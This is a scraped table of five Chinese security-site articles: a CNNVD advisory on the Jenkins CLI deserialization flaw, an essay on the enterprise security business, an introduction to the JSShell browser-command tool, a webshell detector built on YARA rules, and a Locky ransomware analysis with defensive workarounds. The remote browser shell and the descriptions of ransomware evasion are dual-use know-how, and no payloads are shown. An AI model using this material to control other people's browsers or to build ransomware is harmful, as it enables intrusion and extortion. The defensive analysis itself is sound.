"5ccbf9d54f2f0a0a7a69bfd0","近日，国家信息安全漏洞库（CNNVD）收到关于Jenkins CLI存在远程代码执行漏洞(CNNVD-201611-384)的情况报送。该漏洞源于Jenkins CLI存在Java反序列化问题，从而导致远程攻击者可在Jenkins上执行任意代码，进一步控制服务器。","Kong","近日，国家信息安全漏洞库（CNNVD）收到关于Jenkins CLI存在远程代码执行漏洞(CNNVD-201611-384)的情况报送。该漏洞源于Jenkins CLI存在Java反序列化问题，从而导致远程攻击者可在Jenkins上执行任意代码，进一步控制服务器。11月16日，Jenkins官方对上述漏洞已发布升级公告。由于上述漏洞影响范围广，危害级别高，国家信息安全漏洞库（CNNVD）对此进行了跟踪分析，情况如下：一、 漏洞简介CloudBees Jenkins是美国CloudBees公司的一款基于    Java开发的开源的、可持续集成的自动化服务器，它主要用于监控持续的软件版本发布/测试项目和一些定时执行的任务。LTS（Long-Term Support）是CloudBees Jenkins的一个长期支持版本。CloudBees Jenkins 2.31及之前的版本和Jenkins LTS 2.19.2及之前的版本中存在远程代码执行漏洞（漏洞编号：CNNVD-201611-384，CVE-2016-9299）。攻击者可通过传输恶意的序列化Java对象利用该漏洞执行任意代码，绕过保护机制。二、漏洞危害远程攻击者可通过构造恶意的Java序列化对象发送给Jenkins CLI，经其解析执行后，可使Jenkins连接到攻击者控制的LDAP服务器上，该LDAP服务器进一步发送恶意指令，可在Jenkins上执行任意代码，导致服务器被完全控制。据统计，目前，全球现有一万余个网站使用了Jenkins，存在漏洞的网站数量为12579个，其中排在前五的国家分别为美国，中国，爱尔兰，德国以及荷兰。图1 Jenkins全球分布 图2 漏洞影响全球分布情况我国受影响网站约有1577个，主要位于浙江(61%)    、北京(19%)、上海(6%)等城市，以互联网企业、高校等行业网站为主。图3 Jenkins中国分布 图4 漏洞影响我国分布情况三、修复措施目前，Jenkins官方已发布针对该漏洞的修复版本，并且，该漏洞细节及利用方式已在互联网上公布，请受影响的用户尽快升级至最新版本以消除漏洞影响。1. Jenkins main line用户应升级至2.32版本2. Jenkins LTS用户应升级至2.19.3版本Jenkins公告链接：https://jenkins.io/blog/2016/11/16/security-updates-addressing-zero-day/ 本报告由CNNVD技术支持单位—北京长亭科技有限公司、北京白帽汇科技有限公司提供支持。 CNNVD将继续跟踪上述漏洞的相关情况，及时发布相关信息。如有需要，可与CNNVD联系。","2016-11-26","漏洞发布","关于Jenkins CLI漏洞情况的通报","http://nsoad.com/Article/exploit/20161126/vulzone-39.html"
"5ccbf9d54f2f0a0a7a69bfd1","怎么把企业安全这门生意做好，创造更多客户价值。","刘洪善","关于作者刘洪善百度安全资深产品架构师，负责百度安全企业级产品的设计和商业化，主导了多个百度安全最佳实践的产品化和安全能力输出项目，对企业级产品的设计和运营，有广泛的涉猎和深刻的理解。加入百度前，刘洪善在国内视频行业排名第一的爱奇艺，负责爱奇艺的安全建设、安全管理和安全运维等，对企业安全建设有丰富的经验和独特的见解。这几年，一直在百度做互联网安全相关的工作，从刚开始的安全运维、安全开发，到内部安全管理，到现在的安全产品设计和运营，期间根据公司需要，担任和接触过研发、管理、运营、市场、产品、销售等工作。虽然经历了百度安全从对内到外、从做好自身安全到安全商业化的历程，但主线一直没变：怎么把企业安全这门生意做好，创造更多客户价值。安全行业这方面的介绍较少，这里我就把我的一部分思考分享出来，希望对从事企业业务特别是企业安全的你有所帮助。第一节、客户战略1、产品按行业标杆化按行业里树立自己的产品标杆，让口碑带动销售。 1.1、产品行业化。按照不同行业的特点来梳理和标准化的自己的产品，而不能像用户产品一样，一招鲜吃遍天。比如SaaS类安全产品，集成了各种功能，检测、防护、加速，哪些功能是哪个行业所需的？都要吗？经常走访行业客户，梳理客户的商业流程，就很容易得到答案。设计企业产品，本质是满足客户商业流程的效率需求，或者叫提高生产效率。比如针对政企行业，有的产品为了方便主管部门类客户大批量管理辖下网站，就设置了大批量网站添加和扫描功能；比如针对游戏行业客户，为了提高实时性，针对这部分用户拓宽了CDN节点。 1.2、方案行业化。客户通过组合各种产品才能满足自身的需求已经司空见惯，而企业又不可能根据客户的特殊需求来定制一款“万能”的解决方案，因此企业产品有越来越API化的趋势。某款产品是某些主要功能API的集合，而集合的产品本身也越来越像API，专注于解决一个问题。比如WAF，侧重解决web的各种恶意攻击；IDS，侧重根据流量和日志来分析可能的攻击；抗D产品，侧重拦截疑似DDoS攻击，清洗后回源正常流量。把自己的产品，或自己不擅长，而合作伙伴擅长的产品，组成一个有针对性的行业方案，可以满足更多客户需求，增加客户粘性，也顺带增加销售收入。 1.3、最简单也是最实用的一句话：安全产品行业圈子小，客户圈子也不大。产品做得如何，很容易在业内传播，因此产品打磨得还不到位的话，可以先找一些关系好的天使企业试运营，慢慢完善。或者干脆先不上市，等打磨好再说，因为一款产品，好的口碑不容易获得，但坏口碑一旦建立，却很难修复。 2、大中小微产品到底瞄准哪些客户群？除了瞄准行业，每个行业里企业也分了大中小微。主要的产品，瞄准哪个层级的市场？这并没有范式，只能根据实际的运营效果来决定。2.1、在国内，一想到企业市场，大家理所当然地想到先做大企业客户。大企业确实无论在付费、留存等各方面都有很大的优势，业内常有“三年没单子，一单吃三年”的说法，但做大企业客户相应的也有成单周期长、获客成本高、难成单等特点。2.2、中小微企业则容易线上交付，降低销售成本，获客成本也非常低。但相应付费、留存都无法和大企业相比，此时做新客、做留存、做转换、做渗透成了要做的4个方面，玩法更像互联网的用户产品。3.3、无法决定面向哪个用户群的时候，先选大企业客户群一般总是没错的。3、完善的定价策略国内的企业产品，特别是安全产品，在定价上有随意化的特点。需要明确两点：定价是交付客户价值的最终体现，不完善的定价体系，表明对产品的价值思考也不完善；完善的定价体系，是产品最终成熟的表现：综合了自身价值，客户价值，市场竞争等各方面因素后的战略选择。所以，必须认真对待产品的定价，除了最简单随意的方法，比如参照竞争对手的定价，有没有什么定价上的方法呢？还是有的：3.1、按照用户数定价。就是按照交付给客户，客户服务的最终用户数量来定价。这类定价法，一般是针对SaaS化、API化的安全产品。比如防刷单产品，按接口调用次数计费，1分钱100次。缺点是无法满足不同规模用户的需求，比如有的大企业一天调用几千万次，有的小企业一天只调用几百次。因此必须按规模建立差级价格，特价特办，比如大于100万次一1分钱调用500次等，按照客户的使用情况调整，兼顾大小客户。3.2、按版本区分定价。这是企业产品最常见的定价方法。比如按客户的规模，划分为免费版、专业版、商务版、企业版、定制版等，比如salesforce就是按照这种方法定价，加大版本间的差距，从最低到最高版本，10~20倍都可以接受，只要说明产品价值并确实交付。缺点是版本增加新的内容后，无法加价以体现新的价值。因此规划之初应考虑到日后版本新增带来的增值空间。3.3、模块化定价。也就是把产品划分为不同模块，每个模块一个价。模块里还可以划分不同的价差。可以弥补3.2定价新内容不能体现新价值的缺点，缺点是这种模式容易让客户迷糊，不知道怎么选择，因此模块不能太多，2~3种即可，每个模块也划分2~3个价差版本即可。3.4、整体方案定价。即通过组合产品，产生更多的产品销售，同时也给予客户更多的优惠。总之，首先是考虑产品真正带来的客户价值（CV），其次计算获客成本（CAC），最后根据可容忍的回收期（PBP）基本就可以算出定价。当然也要考虑市场特别是竞争对手带来的波动。4、服务/非服务做企业市场的，一般服务都会占不少的收入。比如企业安全市场的安全培训、安全咨询、渗透测试等，都可算作服务类。服务类的工作，能够增加客户价值，增加粘性，但同时由于其高昂的成本，又使得安全企业对之又爱又恨。怎么处理？4.1、服务SaaS化、网络化、自动化。比如安全培训能标准化的标准化，能网络讲课的网络讲课。比如渗透测试，浅层次的自动化，就可以满足客户进行网站体检的需求。核心就是尽量降低服务带来的成本支出。4.2、在收入较小时，安全服务所占的比例大，无可避免，也不必刻意回避。因为服务是锁定客户的重要手段。4.3、在收入较大后，可以考虑通过优化或标准化产品，来减少服务的投入。5、数据运营体系化大部分公司的运营数据，无外乎用户量、流水等这些常规的数据，但对企业安全产品来说远远不够。应根据业特点，关注更广泛的数据：5.1、新客。市场覆盖率如何，够不够在其中挖掘付费客户。比如一般100个潜在用户，能转换为付费用户的比例在3%左右，触达的用户够不够？5.2、转换。潜在客户转换为付费用户的真实比例，为什么？5.3、留存。这里指付费用户的留存，也就是用户继续付费使用产品的数量.5.4、渗透。即客户同类消费，在你这里消费了多少？5.5、CAC（Customer Acquisition Cost）。即获客成本，也即收入与支出的比值，支出包括人工支出、研发支出、销售支出、市场支出；收入，即客户带来的销售收入。5.6、MRR，即客户月经常性收入。5.7、LTV（Life Time Value）。即客户终生价值，即与客户交往的所有活动产生中，客户为企业来的总利润。5.8、PBP（Payback Period）。即回收期，即多长时间可以回本。一般1年为佳，长线的公司也有5年左右的。第二节、分角色分级1、角色账号体系企业产品的参与方是各种各样的。单就安全产品来说，技术部门里需要参与安全的可能有老板、安全、运维、研发等各种人员。一个安全产品从意向到最终在企业落地，经过的路径纷繁复杂。因此需要根据不同角色的来设计产品或者运营策略。如一个企业按一个组织分配权限，组织里可以设置不同的角色，如管理员、研发人员、老板。相互的权限做隔离，老板可以查看所有信息，但主要展现安全运营报表；安全人员可以管理漏洞，编写修复方案，并邮件发送给制定研发团队；研发人员可查看发给自己的安全工单，并进行处置等等。一个成熟的企业产品，应该充分考虑了企业的角色和流程，并且优化了这种流程，针对不同角色设计不同的权限和功能，协同工作。2、会员特权体系企业产品也要像用户产品一样，设置会员特权体系，不同贡献的客户，享受不同的特权，贡献越大，特权越大。特权显示在哪里呢？可以是价格优惠，可以是品牌露出，可以是其他价值增值。2.1、做会员体系，不是为了多赚钱，是为了给不同的客户交付不同的价值。有的客户需要更多的服务，并愿意为此付费；有的客户则不需要。而等级分明的会员体系，能把客户需求明确区分出来，并把高价值的服务交付给高付费的用户。这对企业、对客户都是负责的市场行为。2.2、会员体系要动态调整，严格按照贡献的利润和价值来区分等级，贡献大的往上，贡献小的往下，以前贡献大的现在贡献小了也可以往下调。 3、完善的引导体系企业产品一般给人的感觉是：丑、贵、难用。给人这种感觉，一方面是企业产品本质确实只是个生产工具，没必要在不必要的细节上花心思；一方面是设计之初就没有清楚，企业产品虽然是卖给企业，但毕竟是具体的人在用。但是考虑到企业产品的本质是提高生产效率的工具，如果使用流程设计得丑贵难，又怎么能使得用产品的工作人员提高效率呢？这本身就很个矛盾。而且具体使用产品的人的用户体验，直接决定了产品的口碑和二次付费的可能。因此，企业产品也必须像用户产品一样，考虑好使用流程的同时，做好：3.1、界面设计。不求华丽时尚，但求简单易懂。3.2、用户引导。对初次登录的用户，必须进行引导。对老的用户，也应把引导折叠的位置明确提醒出来，再次遇到问题的时候可以再次查看引导。3.3、说明文档。通过用户反馈（试用、客服、走访）积累起用户常见问题FAQ；产品上线后，给出明确的技术说明问题；对典型案例的展示问题。3.4、在线帮助。在显眼位置，放置用户在线帮助，以放用户在以上都无法解决的情况下，获得人工帮助。3.4、对应的服务体系。售前/销售/售后。第三节、能力接口化随着企业市场的云化、互联网化，传统的软件或者服务越来越多的以API的方式出现。一方面方便了企业快速迭代；另一方面也培养起了客户对个性化的需求。1、客户通过组合不同的方案，不同的产品，不同的API，灵活的组合，满足自己的需求，越来越成为常态。如，有的客户为了给最终用户提供端上的防钓鱼工具，集成了百度网址安全中心的API，实时识别和拦截恶意网址。但企业也不应对客户的需求做到完全定制化，因此其中的成本高，可复制性不可预见，只细到API维度即可。2、API化也是促进行业生态的动力。把自己的能力更多的开放出来，合作伙伴也可以通过使用这些新的、自己不具备的能力来加到自己的产品里，为客户创造更多的价值。3、API化是趋势。做企业产品的经常被形容为站在企业后面的企业，既然本来就不是面向最终用户，因此只要为客户、为最终用户创造价值，产品的形态其实显得无足轻重。那产品的品牌呢？API化并没有削弱品牌，只是不以整装产品的形态出现了，API化后的技术、产品、服务等能力，还是决定品牌是否优质的核心。第四节、运营去互联网化企业不同个人，个人下载软件或者购买产品，是冲动型消费，个人自主意愿就能决定，而企业里的人五花八门，有负责拍板的老板，有负责采购的行政，有负责预算的财务，有负责使用的技术人员。从产品购买意向，到谈判，到采购，到最终安装使用，每个人在其中都扮演了不同角色。因此，企业产品的运营，无法像用户产品一样，通过互联网化的用户画像、通过大数据等来增加成单量。而还是必须依靠线下销售，用销售人员地推的方式，带着明确目的，带着明确方案，和潜在客户接触。1、明确客户的需求。了解客户真正需要什么，预算多少，预期如何落地，什么时候落地。2、明确关键角色。在项目周期里，谁负责拍板？到那个级别？是谁？谁负责预算？谁负责采购？谁负责产品技术评估？谁负责日常使用？明确并推动关键角色，才能使项目快速落地。3、明确方案。在上述评估后，在团队和合作伙伴内匹配可交付的资源，并给出明确产品方案、报价、交付方式、交付时间、SLA、说明文档、试用账号等，促进客户尽快决策。第五节、重视市场宣传推广销售在企业产品运营中不可或缺，但大部分企业就把几乎所有资源都花在销售上，而忽视了市场的作用，或者将市场的作用定位为配合销售，这都是错误的。市场的宣传推广，应主要放在产品差异化上做文章：产品的创新点，产品的技术、价格等优势，并把这些亮点投入潜在客户的视野中。1、市场宣传推塑造行业形象。市场的作用除了直接拉新外，大部分的作用都是缓慢的，但不能因此放弃持续的市场宣传和推广。因为品牌的作用虽然不能立竿见影，但却是长期里，避开竞争对手的围剿，建立行业形象主要的方式。每一次市场活动，每次PR稿件，都包含了对企业形象、产品形象的塑造。2、市场宣传推广承载着企业的文化观、产品观。对外可以感染潜在客户，增加老客户粘性；对内可以激励起员工的自豪感，培养员工的归宿感和认同感。这是销售额带不来的。3、市场宣传推广是企业的喉舌。没有完善的市场宣传推广平台，企业和产品就相当于失声，就难以影响更多客户，就难以影响整个行业。我们对用户的态度？我们对行业的看法？我们产品的特点？酒香也怕巷子深，何况市场上那么多酒。第六节、如何看待新技术新概念安全产品的演化一直没有停止，从最初的防火墙、IDS、IPS到现在的威胁情报、态势感知。每个新的技术，都带来新的概念，进而衍生出新的价值、新的产品。1、欢迎新技术。安全本身就是各种技术的融合，新技术加入到安全产品中，改造并升级产品的价值，也是客户所乐于接受的。大数据时代，也让安全进入了威胁情报时代。云计算时代，让安全进入了云化、SaaS化。人工智能时代，让安全进入了攻防自动化时代。每次的新技术，都让安全产品实现新的升级和新的价值。2、欢迎新概念。一个概念从提出到落地到市场培育出来，大致时间是1-2年。一个好的概念，往往包含了新的行业思考，新的商业模式，新的客户价值，进而促进行业的发展。比如云安全的概念，就从商业模式到技术架构，都革新了旧的模式，进而产生了新的客户价值。3、新技术新产品的加入，一定要更换新的产品名称吗？答案是：不必。如果不是一个颠覆性的革新，或者新的名称特别好，那改名就要谨慎。一忌生造名词。如果一个概念，不打算在市场上花大钱大力推广，进而形成行业产品，那就不要生造概念，特别是一堆只有自己认识的英文缩写，百度上查不到，自己人不认识，怎么给客户去说清楚？这里面有很大的学习成本。二忌经常改动。一个产品名字，除了承载了产品形象外，还有着一系列相关的影响：之前，为宣传推广一个产品，市场花销会因为产品名字的变更而作废；现在，产品名称的变更，需要同步更新从技术、运营、产品、市场、售前、售后、客户等一系列相关的文档、工具、话术，这需要不小的人力成本来整理和变更；将来，新名称会导致新的宣传推广策略，适不适合则需要时间和金钱来检验。二忌自以为是。名字，最根本的作用是简化客户认知。因此，任何使名字所含信息复杂化，让用户不知道所云或者需要大量的学习才能记住的名字，都是坏名字，不管我们觉得如何如何好。另外，我们本身就具备客户所没有的产品知识和场景，所以我们理解的，觉得好的，不妨再问问客户。这方面可以通过调查问卷、走访来获得反馈。第七节、总结总之，生意的本质很简单朴素：赚钱。但做生意不是为了赚钱而赚钱，赚钱只是创造客户价值后的自然衍生。企业市场特别是企业安全市场，有很多玩法，但不变的是客户价值。以上论述，要展开来还有很多东西，但限于篇幅，只能先到此为止，日后再一步步深入。希望从事安全行业的你，多从自己的角度思考业务，不要迷信技术，懂技术更好，不懂也没关系。安全和其他行业相比并没有什么不同，不要因为技术的门槛而没有底气，每个岗位，技术、销售、运营、市场、产品，都是为业务服务，都是为客户服务，思考好自己的那部分，其他部分也是相通的。共勉。* 本文作者：刘洪善，转载请注明来自FreeBuf.COM","2017-01-11 14:38:50","安全管理","在百度：如何做好企业安全这门生意？","http://nsoad.com/news/securityissue/20170111/1013.html"
"5ccbf9d54f2f0a0a7a69bfd2","本文将给大家介绍一款基于Web的多用户交互式Shell","Silence","JSShell本文将给大家介绍一款基于Web的多用户交互式Shell，该工具采用Python语言编写，服务器端使用的是Flask框架，而客户端当然就是JavaScript和HTML组成的了。我当初在开发JSShell的时候只是想在测试和研究的过程中用它来远程调试浏览器的网络通信和信息处理等活动，但是我现在意识到了这款工具的作用远远不止于此，所以请各位不要将其用于恶意目的，作者Daniel Abeles对此一概不负责。工具安装话不多说，先上GitHub传送门【点我】。我们建议使用虚拟环境来安装JSShell，作者使用的是Python3.6，但JSShell也支持3.6之前的Python版本。Pyenvpyenv virtualenv -p python3.6 venvpyenv activate venvvirtualenvvirtualenv -p python3.6 venvsource venv/bin/activate一键配置环境pip install -r requirements.txtJSShell的特点-支持多客户端；-支持循环DOM对象；-预生成脚本；-命令队列；工具运行创建数据库：python db_handler.py create开启服务器（后台）：python run.py通过浏览器访问服务器地址：如果你的服务器在本地，那么你可以直接用浏览器访问http://localhost:5000（端口可能会不同）打开交互式Shell：python shell.py可选项：预生成脚本每当新的客户端进行注册时，这些脚本都将会运行，不过你也可以根据你的需要来进行修改，一切都取决于你自己:)工具使用这个Shell接口给我们提供了多种可用的操作指令，你可以使用‘help’命令来查看所有命令，终端界面如下所示：你可以使用命令队列来申请执行多个命令，客户端将会一个一个执行这些命令。所有的命令都会在相同的环境（context）中执行，所以你可以一次性执行多个相关命令。如果你想查看发送给客户端的命令，首先你需要选择一个客户端：&gt;&gt; select 1然后使用‘coms’命令来查看所有发送给该客户端的命令：(Client 1) &gt;&gt; coms查看所有的命令以及相应的输出结果：(Client 1) &gt;&gt; com 1工作流程当所有的安装和配置都已完成之后，JSShell的工作流程如下：1.  客户端访问主页http://localhost:5000/；2.  然后向服务器端发送一个‘register’请求；3.  等待用户输入命令；4.  与此同时，你可以使用shell.py脚本并在服务器端执行命令；5.  客户端从服务器端获取命令，当其得到了新的命令之后，会立刻将其加入队列并依次执行；6.  命令执行完成之后，会将执行结果返回给服务器端；7.  现在，我们可以使用‘coms’命令来查看输出结果了；数据库管理我们在这里给大家提供了一个名为db.handler.py的脚本，这个脚本包含多种数据库管理功能，你可以用它来管理和测试你的数据库。","2017-03-23 13:39:31","安全工具","JSShell：一个基于python的交互式Shell","http://nsoad.com/Security-tools/20170323/tools-1121.html"
"5ccbf9d64f2f0a0a7a69bfd3","PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具。","六翼","PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具，比如以下组件都可以被检测发现。Best PHP ObfuscatorCarbylamineCipher DesignCyklodevJoes Web Tools ObfuscatorP.A.SPHP JiamiPhp Obfuscator EncodeSpinObfWeevely3atomikucobra obfuscatorphpencodetenncweb-malware-collectionwebtoolsvnnovahot工作原理PHP-malware-finder的检测原理是基于YARA规则爬取文件系统和测试文件，如可以发现经过两次编码、解压的危险参数。使用方法两种使用方法:$ ./phpmalwarefinder -hUsage phpmalwarefinder [-cfhtv] [-l (php|asp)] &lt;file|folder&gt; ...    -c  Optional path to a configuration file    -f  Fast mode    -h  Show this help message    -t  Specify the number of threads to use (8 by default)    -v  Verbose mode    -l  Set language ('asp', 'php')也可以这样:$ yara -r ./php.yar /var/www$ yara -r ./asp.yar /var/www可以通过修改yar文件添加规则:使用测试:查杀一下自己平时收集到的免杀shell，覆盖度还是蛮高的。下载地址github地址:https://github.com/nbs-system/php-malware-finder","2017-03-12 13:17:35","安全工具","一款好用的php webshell检测工具","http://nsoad.com/Security-tools/20170312/tools-1112.html"
"5ccbf9d64f2f0a0a7a69bfd4","Locky敲诈者木马算是敲诈者木马中传播时间较长，变种较多的一款。","kong","0×1 前言Locky敲诈者木马算是敲诈者木马中传播时间较长，变种较多的一款。在最近一段时间里，其变种Thor、Aesir开始频繁出现。这些Locky变种之间的核心加密功能代码几乎是相同的，只是改动了加密的后缀名，不过相比较老版本的Locky敲诈者，此类新变种在自我防御机制上有了较大改变，例如利用全局原子表代替注册表项存储标志字符串以应对对于相关注册表项的检测。不过即使填补了旧版Locky的坑，Locky新变种依然存在一些可以用来免疫的点，本文就旨在通过对Locky新变种的一些技术细节的分析来谈谈对此类木马的免疫手段。0×2 先看看Locky的新变化1.  感染方式的变化感染方式上其实不能称作变化，应该称之为扩展。早期的Locky一般通过邮件传播，恶意代码存在于邮件附件Word文档中，通过调用Word宏执行恶意代码。而Locky新变种的感染方式有所增加，除了Word宏执行恶意代码之外，也存在以JS脚本作为邮件附件进行感染的变种。除外，Locky新变种借助PowerShell或PowerShell+Rundll32组合执行恶意代码。下图展示的是一款Locky新变种使用的代码执行方式，其使用PowerShell启动恶意程序进程。图1 使用PowerShell启动恶意程序进程2.    标志字符串存储的变化老版本Locky敲诈者会访问一些相关的注册表项并将一些标志字符串存储在注册表中，例如HKCU\Software\Locky注册表项。这些标志字符串用来判断该计算机中的文件是否已被加密，以及此次加密工作是否完成。此类方法最大的缺陷在于用户可以设置ACL阻止任何用户访问相关注册表项或者自定义一个相同的注册表项来“欺骗”敲诈者。Locky新变种摈弃了注册表，转而使用全局原子表来存放相关的标志字符串。由于访问全局原子表并不需要打开操作，一般用户也不知道如何往全局原子表中添加全局原子来“欺骗”敲诈者，因此该方法相比较使用注册表存储标志字符串的方法更加有效。 图2 程序查询原子表相关字符串以判断计算机是否已被感染    3.    密钥和加密老版本Locky敲诈者从服务器获取RSA公钥，当然这么做并不能保证程序能正常获得RSA公钥。由于存放密钥的地址经常发生变更，可能用户感染敲诈者时该地址已失效，因此在服务器存放RSA公钥并不能保证每次都能加密成功。Locky新变种采用了和大部分敲诈者一样的方式，将RSA公钥硬编码到程序中，这就能保证成功加密文件。在加密方式上，Locky新变种和老版本相同，使用微软提供的一系列API完成加密工作。0×3 再说说对Locky新变种的免疫手法1.    从Rundll32.exe入手正如上文提到的，Locky新变种在恶意代码的运行方式上相比较老版本复杂的多，主要也是从对抗杀软这方面考虑。在这些新变种中，使用最为广泛的当属Rundll32.exe运行恶意dll的方式。微软对于Rundll32.exe的使用做了限制，使用命令行调用Rundll32.exe时命令行必须满足以下格式。而对于使用Rundll32.exe执行的导出函数，其必须参数必须满足如下要求。    但是查看Locky新变种释放的恶意Dll发现该Dll并无导出函数。    图3 IDA显示Dll无导出函数其实这是恶意Dll使用的伎俩。由于Rundll32.exe执行Dll导出函数的流程是LoadLibraryExW—GetProcAddress—ExportFuntion，第一步LoadLibraryExW会导致Dllmain的执行，而恶意Dll在Dllmain中将自身的代码从内存中解除映射，并映射新的代码，新的代码中定义了导出函数，因此该恶意Dll就完成了导出函数从无到有的转变。图4 完成代码重建后Dll“生”出了导出函数使用这种方法构造了一种无导出函数的Dll调用导出函数的假象。也为分析造成了一些困扰。不过该恶意程序为了实现代码的重建也是付出了一定的代价，这也算是一个可以防御的点。之所以说恶意程序付出了一定代价，是因为其使用了TLS（线程局部存储）技术，该技术解决了多线程中线程操作全局变量带来的冲突问题。下图展示了Dll的区段组成，可以很清楚地看到.tls段。图5 Dll的区段中存在.tls段对于WinXP而言，在程序执行主功能代码之前会初始化静态定义的线程局部变量，因此在程序执行主功能前已经分配一部分内存用于存储线程局部变量，如果程序运行中动态调用一个Dll（例如使用LoadLibary函数调用Dll），且该Dll中也静态定义了线程局部变量，由于存储线程局部变量的空间已经固定，将导致Dll的线程局部变量无法初始化，从而导致Dll调用失败。同理，Rundll32.exe在执行主功能代码之前已经初始化静态定义的线程局部变量，在执行过程中调用LoadLibraryExW函数加载恶意Dll。根据恶意Dll存在tls段可以确定该Dll静态定义了线程局部变量，这样就会导致LoadLibraryExW函数调用失败，Rundll32.exe弹出警告框如下所示。图6 Rundll32弹出对话框在Win7及以上版本的操作系统中，允许Dll静态定义线程局部变量，因此Rundll32.exe正常运行，而WinXP也就天然免疫了该变种的入侵——虽是无心插柳，但也可以算是一种免疫手段了吧。2.    从系统语言入手对于Locky，Cerber，XTBL这类疑似俄产敲诈者而言，其最大的特点莫过于自动忽略俄语系国家，对于系统语言为俄语的国家不执行加密工作。因此如果能够让自身系统语言为俄语则可免除这一大系列敲诈者的攻击。当然，直接修改系统语言是不可取的，毕竟绝大部分中国人看不懂俄语，那如何利用系统语言防御诸如Locky这类俄系敲诈者呢，这就需要一些小技巧的辅助。在Locky新变种中使用GetSystemDefaultLangID，GetUserDefaultLangID和GetUserDefaultUILanguage三个函数判断系统语言，这与老版本Locky敲诈者相同。图7 Locky判断系统语言从上图可以很明显的看出，程序对这三个函数的返回值与0x3ff相与后再进行判断，也就是说程序判断的其实是返回值低10位的数值。这三个函数的返回至类型为LANGID，其定义格式如下所示。可以看出，低10位表示的是主语系，也就是说只要系统主语系为0×19（俄语）即不进行加密。而对于LANGID，其主语系和子语系都存在可供用户自定义的区域（主语系为0×200-0x3ff，子语系为0×20-0x3f）。因此可以自定义这样一种LANGID，其主语系为0×19（俄语），而自定义其子语系，并将该LANGID和中文相关资源（例如日历，语言，计数方式）绑定，这样就可以生成一种LANGID主语系为俄语的中文，可以称它为俄语（中国）。将其设为系统默认语言可以使GetSystemDefaultLangID和GetUserDefaultLangID返回值低10位为0×19，躲避敲诈者的感染。当然，如果寻求更加方便的方法，可以使用NLS（National Language Support）来进行当前区域的设定。NLS提供了一种Replacement locale方法，可以在不改变LocaleID的情况下修改它所对应的语言，日历形式，计数形式等。NLS这么做旨在为使用语言和所处区域不同的人群提供一种兼容性的设置，现在可以利用它来防御敲诈者。由于LANGID是LocaleID的一部分，且Replacement locale方法并不会修改旧的LocaleID，因此可以把俄罗斯的LocaleID和中国的相关设置绑定，让系统语言为中文，LANGID为0×19（俄语），从而免疫俄系敲诈者。当然，如果还想更加方便，可以使用微软提供的工具Locale Builder，该工具可以自定义各种语言和区域搭配。上述方法可以修改GetSystemDefaultLangID，GetUserDefaultLangID返回值，而对于GetUserDefaultUILanguage返回值的修改，可以使用MUI（Multilingual User Interface）相关接口，MUI允许用户加载语言资源，相比较NLS更加灵活，在此不在赘述。综上，从系统语言入手防御俄系敲诈者对于个人防御而言算是比较有效的一种方法，但可能会影响其他程序的稳定性，不过这不失为一种值得考虑的方式。3.    从全局原子入手之前提到Locky新变种通过查找全局原子表中指定名称的全局原子确定该计算机是否已被感染。如果事先往全局原子表中添加名称相同的全局原子就可让敲诈者误以为该计算机已经被感染过从而放弃加密。添加全局原子使用的函数时GlobalAddAtom。不过该种方法实用性不高，因为需要事先知道敲诈者使用的全局原子名称，而每一个新变种使用的全局原子名称各不相同，这将防不胜防。图8 程序完成加密后往全局原子表添加原子作为标志4.    从磁盘入手Locky敲诈者在加密文件之前会对磁盘进行遍历，其遍历方式是通过硬编码在程序中的盘符来作为遍历的盘符，从A盘遍历到Z盘，如下图所示。图9 程序遍历磁盘由于程序通过盘符遍历磁盘，因此可以创建一个无盘符的磁盘或者删除相关磁盘的盘符，该磁盘可用于存储重要文档，数据，使用时再为其分配盘符便可正常访问。这样敲诈者木马在遍历磁盘的时候不会遍历到该无盘符磁盘，这也可以保证该磁盘中的文件不会被敲诈者木马加密。除此之外程序忽略了具有FILE_READ_ONLY_VOLUME属性的盘符，因此也可以为盘符设置相应属性躲避敲诈者的加密。5.    顺道聊聊XTBL敲诈者Locky敲诈者能完成诸多功能的一个主要原因在于其拥有较高权限。由于Locky敲诈者的执行大多来自于Word宏的加载，其父进程为Word进程，这很容易让其进程链以管理员权限运行。而另一类利用JS脚本作为邮件附件感染系统的变种也可能因为用户忽略其安全性允许其运行而具有管理员权限。高权限也为程序的一系列行为“铺路”。不过另一款敲诈者XTBL敲诈者就遇到了一些权限难题。在其进行加密操作之前会对当前进程所处环境进行判断，如果不是以管理员权限运行该程序则会通过Runas来提升权限。如下图所示。图10 XTBL使用Runas提权这项操作存在一个缺陷，就是无论在WinXP还是WinXP以上系统都会弹出提示框。由于XTBL敲诈者主要是针对服务器，而且一般通过入侵服务器植入恶意程序，因此入侵者可以手动解决这个问题。但假如个人计算机感染了XTBL敲诈者，那么弹窗就将使该程序变得更加可疑。由于在提权操作之前程序执行代码重组和密钥生成的操作，这些操作需要一定的时间，这也使弹窗的时间点更加可疑。而该提权代码无限循环执行提权操作，因此用户只有允许其以管理员权限运行才能关掉提示框，这也是个比较可疑的地方。因此用户可以结合这几个可疑的点来警惕XTBL敲诈者的侵袭。0×4总结以上分享了一些利用Locky新变种的固有缺陷或者考虑不周的特性来免疫它的攻击的方法，对于个人用户而言虽具有一定效果和加之，但想更全面的抵御各类木马的侵袭，依然需要安全软件的防护。安全意识的提高、安全习惯的养成、安全软件的防护，只有这三方面共同的协作，才能真正有效而全面的保障大家的安全。三者缺一不可，切不能掉以轻心。","2016-12-09 13:03:52","系统安全","从Locky新变种谈敲诈者木马的一些免疫技巧","http://nsoad.com/Article/system/20161209/905.html"
